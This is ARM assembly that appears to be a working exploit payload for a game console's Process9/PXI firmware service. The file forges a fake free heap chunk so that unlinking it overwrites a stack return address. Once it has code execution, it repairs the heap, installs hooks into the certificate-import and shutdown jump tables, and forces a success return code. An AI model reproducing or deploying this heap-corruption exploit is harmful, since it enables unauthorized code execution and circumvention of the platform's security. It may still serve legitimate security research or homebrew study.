.arm

.equ TARGET_RETURN_STACK_ADDR, 0x080C5DE4
.equ TARGET_CHUNK_SIZE, 0x2800
.equ MEMCHUNK_HDR_PREV, 0x8
.equ MEMCHUNK_HDR_NEXT, 0xC
.equ RETURN_CODE_STACK_OFFSET, 0x30

.equ PXIMC_SHUTDOWN_JUMP_TABLE_PTR, 0x08080E20
.equ PXIMC_SWITCH_RETURN, 0x08080E64

.equ PXIAM_IMPORT_CERTIFICATES_JUMP_TABLE_PTR, 0x08081728
.equ PXIAM_SWITCH_BREAK, 0x080828D0
.equ PXIAM_SWITCH_RETURN, 0x08081750

.equ HEAP_ALLOCATE, 0x0805A110

.section    .text.start, "ax", %progbits
.align      2
.global     _start
.type       _start, %function
_start:
  b _code_start

.org _start + MEMCHUNK_HDR_NEXT
.word 0xDEADC0DE                                    // overwritten, garbage

_code_start:
  push {r2-r6}                                      // preserve original registers
  mov r4, r2

  ldr     r0, =__bss_start
  mov     r1, #0
  ldr     r2, =__bss_end
  sub     r2, r2, r0
  bl      memset

  /*
    r2 holds a pointer to the free heap chunk that
    contains this code (between _start and fake_free_chunk)
    heapRepair remove it from the free list and repair fake_free_chunk
    (we don't want it to be reallocated since it holds our code)
  */
  mov r0, r4
  bl heapRepair
  bl installHooks

  pop {r2-r6}                                       // restore regs
  mov r0, #0
  str r0, [sp, #RETURN_CODE_STACK_OFFSET]           // change return code on stack to force success
  pop {r2-r6, pc}                                   // return to actual service code

installHooks:
  ldr r0, =PXIAM_IMPORT_CERTIFICATES_JUMP_TABLE_PTR
  adr r1, _pxiamImportCertificatesHook
  str r1, [r0]
  ldr r0, =PXIMC_SHUTDOWN_JUMP_TABLE_PTR
  adr r1, _pximcShutdownHook
  str r1, [r0]
  bx lr

_pxiamImportCertificatesHook:
  mov r0, r5
  bl pxiamImportCertificatesHook
  ldr r1, =PXIAM_SWITCH_BREAK
  bx r1

_pximcShutdownHook:
  mov r0, r4
  bl pximcShutdownHook
  ldr r1, =PXIMC_SWITCH_RETURN
  bx r1

.global panic
.type panic, %function
panic:
  mov r0, #0
  svc 0x3C

.global heapAllocate
.type heapAllocate, %function
heapAllocate:
  ldr r1, =HEAP_ALLOCATE
  bx r1

/*
  this is the fake chunk that trigger an arb write on the stack
  it is repaired once we get code exec (see heapRepair)
*/
.section  .fake_free_chunk
.global   fake_free_chunk
fake_free_chunk:
.word 0x00004652                                    // magic
.word 0xDEADC0DE                                    // size
.word _start                                        // prev
.word TARGET_RETURN_STACK_ADDR - MEMCHUNK_HDR_PREV  // next
